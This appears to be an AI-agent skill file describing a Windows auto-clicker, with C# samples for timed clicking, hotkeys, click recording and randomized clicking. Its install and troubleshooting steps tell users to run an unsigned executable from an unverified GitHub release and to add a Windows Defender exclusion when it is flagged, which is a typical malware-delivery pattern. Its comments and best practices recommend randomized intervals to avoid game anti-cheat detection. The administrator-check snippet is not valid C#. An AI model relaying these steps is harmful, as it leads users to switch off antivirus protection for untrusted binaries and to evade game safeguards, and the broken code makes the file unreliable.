---
name: op-auto-clicker
description: Automate mouse clicks with customizable intervals, hotkeys, and macros using OP Auto Clicker for Windows
triggers:
  - how do i set up an auto clicker
  - configure op auto clicker intervals
  - create a mouse clicking macro
  - automate repeated clicks in windows
  - use op auto clicker with hotkeys
  - build custom clicking automation
  - implement auto click functionality
  - set up click recording and playback
---

# OP Auto Clicker

> Skill by [ara.so](https://ara.so) — Devtools Skills collection.

OP Auto Clicker is a Windows-based automation tool that provides programmable mouse clicking with customizable intervals (milliseconds to hours), hotkey triggers, click recording/playback, and macro support. Built in C#, it enables automated clicking for gaming, testing, and repetitive task automation.

## Installation

### Using Pre-built Release

1. Download from the releases page:
```bash
# Direct download link
https://github.com/jiaoyanming0-bot/OPAutoClicker/releases/latest
```

2. Extract `OPClicker.zip` and run the `.exe` file (portable, no installation required)

3. Grant permissions if Windows Defender flags it (common for unsigned automation tools)

### Building from Source

```bash
# Clone the repository
git clone https://github.com/jiaoyanming0-bot/OPAutoClicker.git
cd OPAutoClicker

# Open in Visual Studio
# Open the .sln file and build (Ctrl+Shift+B)
```

**Requirements:**
- Windows OS
- .NET Framework (typically pre-installed on Windows)
- Visual Studio 2019+ (for building from source)

## Core Features

### Click Automation Types

**Single/Double/Triple Click**
- Configure click count per automation cycle
- Set precise intervals between clicks

**Mouse Buttons**
- Left click (most common)
- Right click
- Middle click (scroll wheel)

**Repeat Modes**
- Until stopped (manual termination)
- Fixed count (stop after N clicks)

**Position Targeting**
- Current mouse location
- Pick specific coordinates
- Record and playback sequences

## C# Integration Examples

### Basic Auto Clicker Implementation

```csharp
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace AutoClickerCore
{
    public class ClickAutomation
    {
        // Import Windows API functions
        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
        
        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        
        private bool isRunning = false;
        private Thread clickThread;
        
        public void StartClicking(int intervalMs, int clickCount = -1)
        {
            isRunning = true;
            clickThread = new Thread(() => ClickLoop(intervalMs, clickCount));
            clickThread.Start();
        }
        
        public void StopClicking()
        {
            isRunning = false;
            clickThread?.Join();
        }
        
        private void ClickLoop(int intervalMs, int maxClicks)
        {
            int clicksPerformed = 0;
            
            while (isRunning && (maxClicks == -1 || clicksPerformed < maxClicks))
            {
                PerformClick();
                clicksPerformed++;
                Thread.Sleep(intervalMs);
            }
        }
        
        private void PerformClick()
        {
            // Simulate left mouse button down and up
            mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
            mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
        }
    }
}
```

### Hotkey Integration

```csharp
using System;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace AutoClickerCore
{
    public class HotkeyManager : Form
    {
        [DllImport("user32.dll")]
        private static extern bool RegisterHotKey(IntPtr hWnd, int id, uint fsModifiers, uint vk);
        
        [DllImport("user32.dll")]
        private static extern bool UnregisterHotKey(IntPtr hWnd, int id);
        
        private const int HOTKEY_ID = 1;
        private const uint MOD_ALT = 0x0001;
        private const uint MOD_CONTROL = 0x0002;
        private const uint VK_F8 = 0x77; // F8 key
        
        private ClickAutomation automation;
        private bool isActive = false;
        
        public HotkeyManager()
        {
            automation = new ClickAutomation();
            
            // Register F8 as toggle hotkey
            RegisterHotKey(this.Handle, HOTKEY_ID, 0, VK_F8);
        }
        
        protected override void WndProc(ref Message m)
        {
            const int WM_HOTKEY = 0x0312;
            
            if (m.Msg == WM_HOTKEY && m.WParam.ToInt32() == HOTKEY_ID)
            {
                ToggleClicking();
            }
            
            base.WndProc(ref m);
        }
        
        private void ToggleClicking()
        {
            if (isActive)
            {
                automation.StopClicking();
                isActive = false;
                Console.WriteLine("Auto-clicker stopped");
            }
            else
            {
                automation.StartClicking(100); // 100ms interval
                isActive = true;
                Console.WriteLine("Auto-clicker started");
            }
        }
        
        protected override void Dispose(bool disposing)
        {
            UnregisterHotKey(this.Handle, HOTKEY_ID);
            base.Dispose(disposing);
        }
    }
}
```

### Click Recording and Playback

```csharp
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;

namespace AutoClickerCore
{
    public class ClickRecorder
    {
        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int x, int y);
        
        [DllImport("user32.dll")]
        static extern bool GetCursorPos(out Point lpPoint);
        
        private List<ClickAction> recordedActions = new List<ClickAction>();
        private bool isRecording = false;
        private DateTime recordingStart;
        
        public void StartRecording()
        {
            recordedActions.Clear();
            isRecording = true;
            recordingStart = DateTime.Now;
        }
        
        public void RecordClick(MouseButton button)
        {
            if (!isRecording) return;
            
            Point cursorPos;
            GetCursorPos(out cursorPos);
            
            var action = new ClickAction
            {
                Position = cursorPos,
                Button = button,
                TimestampMs = (int)(DateTime.Now - recordingStart).TotalMilliseconds
            };
            
            recordedActions.Add(action);
        }
        
        public void StopRecording()
        {
            isRecording = false;
        }
        
        public void Playback(int repeatCount = 1)
        {
            for (int i = 0; i < repeatCount; i++)
            {
                int lastTimestamp = 0;
                
                foreach (var action in recordedActions)
                {
                    // Wait for the recorded delay
                    int delay = action.TimestampMs - lastTimestamp;
                    if (delay > 0)
                        Thread.Sleep(delay);
                    
                    // Move cursor and click
                    SetCursorPos(action.Position.X, action.Position.Y);
                    PerformClick(action.Button);
                    
                    lastTimestamp = action.TimestampMs;
                }
            }
        }
        
        private void PerformClick(MouseButton button)
        {
            uint downFlag = button == MouseButton.Left ? 0x0002u : 0x0008u;
            uint upFlag = button == MouseButton.Left ? 0x0004u : 0x0010u;
            
            mouse_event(downFlag, 0, 0, 0, 0);
            mouse_event(upFlag, 0, 0, 0, 0);
        }
        
        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
    }
    
    public class ClickAction
    {
        public Point Position { get; set; }
        public MouseButton Button { get; set; }
        public int TimestampMs { get; set; }
    }
    
    public enum MouseButton
    {
        Left,
        Right,
        Middle
    }
}
```

### Randomized Clicking Pattern

```csharp
using System;
using System.Threading;

namespace AutoClickerCore
{
    public class RandomizedClicker
    {
        private Random random = new Random();
        private bool isRunning = false;
        
        public void StartRandomClicking(int minIntervalMs, int maxIntervalMs)
        {
            isRunning = true;
            
            new Thread(() =>
            {
                while (isRunning)
                {
                    PerformClick();
                    
                    // Randomize interval to avoid detection
                    int delay = random.Next(minIntervalMs, maxIntervalMs);
                    Thread.Sleep(delay);
                }
            }).Start();
        }
        
        public void StopClicking()
        {
            isRunning = false;
        }
        
        private void PerformClick()
        {
            mouse_event(0x0002, 0, 0, 0, 0); // Left down
            Thread.Sleep(random.Next(10, 30)); // Randomize click duration
            mouse_event(0x0004, 0, 0, 0, 0); // Left up
        }
        
        [System.Runtime.InteropServices.DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
    }
}
```

## Configuration Patterns

### Basic Configuration Class

```csharp
namespace AutoClickerCore
{
    public class ClickerConfig
    {
        // Timing
        public int IntervalMilliseconds { get; set; } = 100;
        public bool RandomizeInterval { get; set; } = false;
        public int RandomRangeMs { get; set; } = 50;
        
        // Click settings
        public MouseButton Button { get; set; } = MouseButton.Left;
        public ClickType ClickType { get; set; } = ClickType.Single;
        
        // Repeat mode
        public RepeatMode RepeatMode { get; set; } = RepeatMode.UntilStopped;
        public int ClickCount { get; set; } = 100;
        
        // Position
        public bool UseFixedPosition { get; set; } = false;
        public System.Drawing.Point FixedPosition { get; set; }
        
        // Hotkeys
        public System.Windows.Forms.Keys StartStopKey { get; set; } = System.Windows.Forms.Keys.F8;
    }
    
    public enum ClickType
    {
        Single,
        Double,
        Triple
    }
    
    public enum RepeatMode
    {
        UntilStopped,
        FixedCount
    }
}
```

## Common Use Cases

### Gaming Automation (Roblox/Minecraft AFK)

```csharp
public class GameAutomation
{
    private ClickAutomation clicker = new ClickAutomation();
    
    public void StartAFKClicking()
    {
        // Click every 5 seconds to prevent AFK kick
        clicker.StartClicking(5000);
    }
    
    public void StartFastMining()
    {
        // Rapid clicking for mining/harvesting
        clicker.StartClicking(50);
    }
}
```

### UI Testing Automation

```csharp
public class UITestClicker
{
    private ClickRecorder recorder = new ClickRecorder();
    
    public void RecordTestSequence()
    {
        recorder.StartRecording();
        // User performs manual clicks
        Thread.Sleep(10000);
        recorder.StopRecording();
    }
    
    public void RunTest(int iterations)
    {
        recorder.Playback(iterations);
    }
}
```

## Troubleshooting

### Windows Defender False Positive

**Issue:** Windows flags the executable as malware
**Solution:**
- This is common for automation tools using low-level Windows APIs
- Add exception in Windows Defender: Settings > Update & Security > Windows Security > Virus & threat protection > Manage settings > Exclusions
- Or build from source to verify code integrity

### Clicks Not Registering

**Issue:** Application doesn't detect clicks
**Solution:**
```csharp
// Run with elevated privileges
[System.Security.Principal.WindowsPrincipal]
bool isAdmin = new System.Security.Principal.WindowsPrincipal(
    System.Security.Principal.WindowsIdentity.GetCurrent()
).IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);

if (!isAdmin)
{
    Console.WriteLine("Run as Administrator for full functionality");
}
```

### Hotkey Not Working

**Issue:** Hotkey doesn't trigger
**Solution:**
- Ensure the hotkey isn't already registered by another application
- Use `UnregisterHotKey` before re-registering
- Check that the form handle is properly initialized

### Game Anti-Cheat Detection

**Issue:** Getting banned for "inhuman" clicking patterns
**Solution:**
```csharp
// Use randomized intervals
var randomClicker = new RandomizedClicker();
randomClicker.StartRandomClicking(80, 150); // 80-150ms variance
```

## Best Practices

1. **Always provide a stop mechanism** (hotkey or timeout)
2. **Use randomization** for gaming to avoid detection
3. **Test with low intervals** before increasing speed
4. **Run as Administrator** when automating other applications
5. **Respect game ToS** — some games prohibit automation
6. **Add delays between clicks** to avoid system overload

## License

MIT License — Free to use, modify, and distribute.
